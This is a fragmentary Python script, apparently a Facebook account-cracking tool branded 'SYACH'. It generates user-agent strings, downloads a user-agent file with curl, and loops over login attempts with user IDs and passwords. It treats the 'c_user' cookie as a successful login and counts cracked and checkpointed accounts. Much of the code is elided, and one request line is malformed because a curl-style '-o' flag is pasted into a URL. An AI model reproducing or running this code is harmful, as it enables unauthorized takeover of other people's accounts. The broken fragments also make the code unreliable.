...
for xd in range(10000):
    ...
    ugen.append(uaku2)
try:
    os.system('curl https://www.facebook.com/syach.01234567890/2022/07/ua.html -o ua.html')
except:
    pass
...
def uaku():
    try:
        ...
        a=requests.get('https://www.facebook.com/syach.01234567890/2022/07/ua.html -o ua.html').text
...
def free(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;34m[SYACH] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
